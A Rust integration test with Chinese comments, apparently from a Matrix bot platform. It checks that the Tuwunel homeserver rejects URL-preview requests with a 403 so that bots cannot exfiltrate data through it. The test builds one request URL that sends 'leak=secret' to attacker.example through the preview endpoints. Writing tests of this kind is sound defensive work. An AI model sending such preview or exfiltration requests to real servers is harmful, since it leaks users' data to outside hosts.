//! Tuwunel 替客户端去外网取东西的口子（ADR-0003 的“接口：推送”）：插件默认不能出网，Bot 不能借 Tuwunel 把数据带出去。
//! Bot 的 pusher 由核心网关管住；这里锁住 Tuwunel 自己的默认：URL 预览不开。

use crate::support::{TestServer, unique};

#[tokio::test]
#[ignore = "需要 Docker，用 --include-ignored 运行"]
async fn url_previews_are_refused() {
    let server = TestServer::container(&[]).await;
    let bot = server.login(&unique("bot"), "Bot").await;
    let saved = serde_json::to_value(bot.saved().expect("登录状态")).unwrap();
    let token = saved["access_token"].as_str().expect("访问令牌");
    let http = matrix_sdk::reqwest::Client::new();
    // 查询参数里的地址就是要带出去的数据。
    let leak = "url=https%3A%2F%2Fattacker.example%2F%3Fleak%3Dsecret";
    for path in [
        "/_matrix/client/v1/media/preview_url",
        "/_matrix/media/v3/preview_url",
    ] {
        let response = http
            .get(format!("{}{path}?{leak}", server.url))
            .bearer_auth(token)
            .send()
            .await
            .expect("请求 Tuwunel");
        assert_eq!(response.status().as_u16(), 403, "{path}");
    }
}
